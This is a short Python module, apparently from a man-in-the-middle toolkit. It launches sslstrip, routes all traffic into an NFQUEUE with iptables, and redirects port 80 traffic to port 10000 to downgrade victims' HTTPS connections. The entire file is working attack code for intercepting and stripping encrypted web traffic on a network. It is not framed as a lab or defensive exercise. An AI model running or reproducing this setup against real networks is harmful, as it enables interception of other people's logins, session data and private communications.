import subprocess
from utils.enable_port_fwd import enable_port_fwd

downgrade_fwd_cmd = "iptables -I OUTPUT -j NFQUEUE --queue-num 0; iptables -I INPUT -j NFQUEUE --queue-num 0"
downgrade_https = "iptables -t nat -A PREROUTING -p tcp --destination-port 80 -j REDIRECT --to-port 10000"

def instantiate_queue():
    """
    Enables queue by setting IP Tables rules to accomodate forwarding.
    """
    print("[+] Instantiating queue...")
    enable_port_fwd()
    #try:
    proc = subprocess.Popen("sslstrip", shell=True, stdout=subprocess.PIPE)
    print(proc.communicate()[0]),
    proc = subprocess.Popen(downgrade_fwd_cmd, shell=True, stdout=subprocess.PIPE)
    print(proc.communicate()[0]),
    proc = subprocess.Popen(downgrade_https, shell=True, stdout=subprocess.PIPE)
    print(proc.communicate()[0]),
    # except TimeoutExpired:
    #     proc.kill()